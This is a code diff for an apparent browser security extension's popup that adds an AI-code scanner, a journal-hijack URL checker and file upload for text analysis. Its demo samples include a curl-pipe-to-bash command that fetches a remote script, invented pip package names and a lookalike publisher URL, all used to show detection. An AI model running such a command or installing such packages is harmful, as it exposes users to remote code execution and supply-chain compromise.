@@ -11,11 +11,13 @@ document.addEventListener("DOMContentLoaded", async () => {
   let isRealTimeShieldEnabled = true;
   let currentUserMode = "simple";
 
-  // Initialize UI Mode, Tabs, Scanner, Text Analyzer and Settings
+  // Initialize UI Mode, Tabs, Scanner, Text Analyzer, AI & Scholar Guards and Settings
   initUserMode();
   initPopupModeTabs();
   initQuickScanner();
   initTextAnalyzer();
+  initPopupAiGuard();
+  initPopupScholarGuard();
   await initSettingsToggles();
 
   // Query Current Active Tab
@@ -125,19 +127,27 @@ document.addEventListener("DOMContentLoaded", async () => {
   }
 
   /**
-   * Tab Switching between Live Tab, Quick Scanner & Text Analyzer
+   * Tab Switching between Live Tab, Quick Scanner, Text Analyzer, AI Code & Scholar
    */
   function initPopupModeTabs() {
     const liveBtn = document.getElementById("tabLiveBtn");
     const scanBtn = document.getElementById("tabScannerBtn");
     const textBtn = document.getElementById("tabTextBtn");
+    const aiBtn = document.getElementById("tabAiBtn");
+    const scholarBtn = document.getElementById("tabScholarBtn");
+
     const liveSec = document.getElementById("liveTabSection");
     const scanSec = document.getElementById("scannerSection");
     const textSec = document.getElementById("textSection");
+    const aiSec = document.getElementById("aiSection");
+    const scholarSec = document.getElementById("scholarSection");
+
+    const allButtons = [liveBtn, scanBtn, textBtn, aiBtn, scholarBtn];
+    const allSections = [liveSec, scanSec, textSec, aiSec, scholarSec];
 
     function setActiveTab(btn, sec) {
-      [liveBtn, scanBtn, textBtn].forEach(b => b && b.classList.remove("active"));
-      [liveSec, scanSec, textSec].forEach(s => s && s.classList.remove("active"));
+      allButtons.forEach(b => b && b.classList.remove("active"));
+      allSections.forEach(s => s && s.classList.remove("active"));
       if (btn) btn.classList.add("active");
       if (sec) sec.classList.add("active");
     }
@@ -145,6 +155,170 @@ document.addEventListener("DOMContentLoaded", async () => {
     if (liveBtn) liveBtn.addEventListener("click", () => setActiveTab(liveBtn, liveSec));
     if (scanBtn) scanBtn.addEventListener("click", () => setActiveTab(scanBtn, scanSec));
     if (textBtn) textBtn.addEventListener("click", () => setActiveTab(textBtn, textSec));
+    if (aiBtn) aiBtn.addEventListener("click", () => setActiveTab(aiBtn, aiSec));
+    if (scholarBtn) scholarBtn.addEventListener("click", () => setActiveTab(scholarBtn, scholarSec));
+  }
+
+  /**
+   * Popup AI Code & Output Sentinel
+   */
+  function initPopupAiGuard() {
+    const codeInput = document.getElementById("popupAiCodeInput");
+    const scanBtn = document.getElementById("popupAiScanBtn");
+    const resultCard = document.getElementById("popupAiResult");
+    const scoreVal = document.getElementById("popupAiScoreVal");
+    const scoreLabel = document.getElementById("popupAiScoreLabel");
+    const summary = document.getElementById("popupAiSummary");
+    const listEl = document.getElementById("popupAiThreatsList");
+
+    const SAMPLES = {
+      pipe: "curl -sSL https://install-agent.xyz/run.sh | bash\necho 'Agent running...'",
+      hallucination: "import sys\nimport os\n# AI hallucination: sys is standard library, not pip package\npip install sys\npip install flask-jwt-security",
+      safe: "import pandas as pd\nimport numpy as np\ndef clean_data(df):\n    return df.dropna()"
+    };
+
+    document.querySelectorAll(".popup-ai-sample").forEach(btn => {
+      btn.addEventListener("click", () => {
+        const type = btn.getAttribute("data-sample");
+        if (SAMPLES[type]) {
+          codeInput.value = SAMPLES[type];
+          runScan();
+        }
+      });
+    });
+
+    if (scanBtn) scanBtn.addEventListener("click", runScan);
+
+    function runScan() {
+      const code = codeInput ? codeInput.value.trim() : "";
+      if (!code) return;
+
+      const evalData = window.ThreatEngine
+        ? window.ThreatEngine.evaluateAICodeIntegrity(code)
+        : { safetyScore: 20, riskLevel: "MALICIOUS", threats: [{ icon: "⚠️", text: "Flagged AI code" }] };
+
+      if (resultCard) resultCard.style.display = "block";
+      if (scoreVal) scoreVal.textContent = evalData.safetyScore;
+      if (summary) summary.textContent = `${evalData.linesScanned} Lines Analyzed • Status: ${evalData.riskLevel}`;
+
+      if (scoreLabel) {
+        if (evalData.riskLevel === "MALICIOUS") {
+          scoreLabel.className = "quick-score-pill status-danger";
+          scoreLabel.textContent = "MALICIOUS";
+          scoreVal.style.color = "var(--accent-danger)";
+        } else if (evalData.riskLevel === "SUSPICIOUS") {
+          scoreLabel.className = "quick-score-pill status-warn";
+          scoreLabel.textContent = "SUSPICIOUS";
+          scoreVal.style.color = "var(--accent-warn)";
+        } else {
+          scoreLabel.className = "quick-score-pill status-safe";
+          scoreLabel.textContent = "SAFE";
+          scoreVal.style.color = "var(--accent-safe)";
+        }
+      }
+
+      if (listEl) {
+        listEl.innerHTML = "";
+        if (evalData.threats && evalData.threats.length > 0) {
+          evalData.threats.forEach(t => {
+            const item = document.createElement("div");
+            item.className = "reason-item";
+            item.innerHTML = `<span>${t.icon || '⚠️'}</span><span>${t.text}</span>`;
+            listEl.appendChild(item);
+          });
+        } else {
+          listEl.innerHTML = `<div class="reason-item" style="color: var(--accent-safe);"><span>🛡️</span><span>AI code output passed safety checks. No malicious pipes or hallucinated packages.</span></div>`;
+        }
+      }
+    }
+
+    // Preload sample and run scan on initialization
+    if (codeInput && !codeInput.value) {
+      codeInput.value = SAMPLES.pipe;
+      runScan();
+    }
+  }
+
+  /**
+   * Popup Academic Thesis & Journal Hijack Guard
+   */
+  function initPopupScholarGuard() {
+    const input = document.getElementById("popupScholarInput");
+    const scanBtn = document.getElementById("popupScholarScanBtn");
+    const resultCard = document.getElementById("popupScholarResult");
+    const scoreVal = document.getElementById("popupScholarScoreVal");
+    const scoreLabel = document.getElementById("popupScholarScoreLabel");
+    const summary = document.getElementById("popupScholarSummary");
+    const listEl = document.getElementById("popupScholarThreatsList");
+
+    const SCHOLAR_SAMPLES = {
+      "ieee-auth": "https://ieeexplore.ieee.org/document/9876543?doi=10.1109/TPAMI.2023.12345",
+      "ieee-hijack": "https://ieee-xplore-archive.xyz/download/paper.pdf?doi=10.1109/TPAMI.2023.12345",
+      "arxiv": "https://arxiv.org/abs/2301.09876"
+    };
+
+    document.querySelectorAll(".popup-scholar-sample").forEach(btn => {
+      btn.addEventListener("click", () => {
+        const type = btn.getAttribute("data-sample");
+        if (SCHOLAR_SAMPLES[type]) {
+          input.value = SCHOLAR_SAMPLES[type];
+          runScan();
+        }
+      });
+    });
+
+    if (scanBtn) scanBtn.addEventListener("click", runScan);
+
+    function runScan() {
+      const target = input ? input.value.trim() : "";
+      if (!target) return;
+
+      const evalData = window.ThreatEngine
+        ? window.ThreatEngine.evaluateAcademicPaperIntegrity(target)
+        : { riskScore: 80, status: "HIJACKED_JOURNAL_CLONE", threats: [] };
+
+      if (resultCard) resultCard.style.display = "block";
+      if (scoreVal) scoreVal.textContent = evalData.riskScore;
+      if (summary) summary.textContent = `Host: ${evalData.actualHost} • Authority: ${evalData.expectedPublisher || "Independent"}`;
+
+      if (scoreLabel) {
+        const isAuth = evalData.status.includes("AUTHENTIC") || evalData.status.includes("VERIFIED");
+        const isHijacked = evalData.status.includes("HIJACKED");
+        if (isAuth) {
+          scoreLabel.className = "quick-score-pill status-safe";
+          scoreLabel.textContent = "VERIFIED";
+          scoreVal.style.color = "var(--accent-safe)";
+        } else if (isHijacked) {
+          scoreLabel.className = "quick-score-pill status-danger";
+          scoreLabel.textContent = "HIJACKED";
+          scoreVal.style.color = "var(--accent-danger)";
+        } else {
+          scoreLabel.className = "quick-score-pill status-warn";
+          scoreLabel.textContent = "UNVERIFIED";
+          scoreVal.style.color = "var(--accent-warn)";
+        }
+      }
+
+      if (listEl) {
+        listEl.innerHTML = "";
+        if (evalData.threats && evalData.threats.length > 0) {
+          evalData.threats.forEach(t => {
+            const item = document.createElement("div");
+            item.className = "reason-item";
+            item.innerHTML = `<span>${t.icon || '⚠️'}</span><span>${t.text}</span>`;
+            listEl.appendChild(item);
+          });
+        } else {
+          listEl.innerHTML = `<div class="reason-item" style="color: var(--accent-safe);"><span>🛡️</span><span>Official academic publisher authority confirmed. No journal hijacking detected.</span></div>`;
+        }
+      }
+    }
+
+    // Preload sample and run scan on initialization
+    if (input && !input.value) {
+      input.value = SCHOLAR_SAMPLES["ieee-auth"];
+      runScan();
+    }
   }
 
   /**
@@ -267,6 +441,77 @@ document.addEventListener("DOMContentLoaded", async () => {
     const textInput = document.getElementById("textAnalyzerInput");
     const textBtn = document.getElementById("textScanBtn");
     const resultCard = document.getElementById("textScanResult");
+
+    const fileInput = document.getElementById("textFileInput");
+    const uploadBtn = document.getElementById("textUploadBtn");
+    const uploadLabel = document.getElementById("textUploadLabel");
+
+    if (uploadBtn && fileInput) {
+      uploadBtn.addEventListener("click", () => {
+        fileInput.click();
+      });
+
+      fileInput.addEventListener("change", (e) => {
+        const file = e.target.files?.[0];
+        if (!file) return;
+        handleUploadedFile(file);
+      });
+    }
+
+    if (textInput) {
+      textInput.addEventListener("dragover", (e) => {
+        e.preventDefault();
+        textInput.style.borderColor = "var(--accent-blue)";
+      });
+      textInput.addEventListener("dragleave", () => {
+        textInput.style.borderColor = "";
+      });
+      textInput.addEventListener("drop", (e) => {
+        e.preventDefault();
+        textInput.style.borderColor = "";
+        const file = e.dataTransfer?.files?.[0];
+        if (file) handleUploadedFile(file);
+      });
+    }
+
+    function handleUploadedFile(file) {
+      if (uploadLabel) {
+        const sizeKb = (file.size / 1024).toFixed(1);
+        uploadLabel.textContent = `📄 ${file.name.slice(0, 14)} (${sizeKb}KB)`;
+      }
+
+      const ext = file.name.split(".").pop().toLowerCase();
+      const reader = new FileReader();
+
+      if (ext === "pdf") {
+        reader.onload = (ev) => {
+          const rawBuffer = ev.target.result;
+          const textDecoder = new TextDecoder("latin1");
+          const rawText = textDecoder.decode(rawBuffer);
+          const matches = rawText.match(/\(([^\)]{3,})\)/g) || rawText.match(/[a-zA-Z0-9_\-\.\:\/\@]{4,}/g) || [];
+          const cleanText = matches.map(m => m.replace(/[\(\)]/g, "")).join(" ");
+          textInput.value = cleanText.length > 30 ? cleanText.slice(0, 5000) : rawText.slice(0, 5000);
+          runTextScan();
+        };
+        reader.readAsArrayBuffer(file);
+      } else {
+        reader.onload = (ev) => {
+          let content = ev.target.result || "";
+          if (ext === "eml" || ext === "msg") {
+            const subjectMatch = content.match(/Subject:\s*(.*)/i);
+            const fromMatch = content.match(/From:\s*(.*)/i);
+            const bodyParts = content.split(/\r?\n\r?\n/);
+            const subject = subjectMatch ? `Subject: ${subjectMatch[1]}\n` : "";
+            const from = fromMatch ? `From: ${fromMatch[1]}\n` : "";
+            const body = bodyParts.slice(1).join("\n\n");
+            content = `${from}${subject}\n${body}`.trim();
+          }
+          textInput.value = content;
+          runTextScan();
+        };
+        reader.readAsText(file);
+      }
+    }
 
     if (textBtn) textBtn.addEventListener("click", runTextScan);
 
